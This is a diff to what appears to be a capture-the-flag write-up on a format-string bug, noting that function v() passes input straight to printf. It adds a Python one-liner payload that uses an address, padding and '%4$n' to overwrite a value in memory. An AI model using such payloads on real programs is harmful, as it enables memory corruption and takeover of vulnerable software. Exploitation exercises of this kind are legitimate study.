@@ -15,4 +15,6 @@ main makes a simple call to the function v() lets disassemble it
 ![](./resources/v_function.png)
 ```
 the function v is calling printf without a format string which is unsafe since we can start popping items from stack till we find where our input will be stored then we can use the %n modifiers to modify the value at the defined element
+
+python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'
 ```
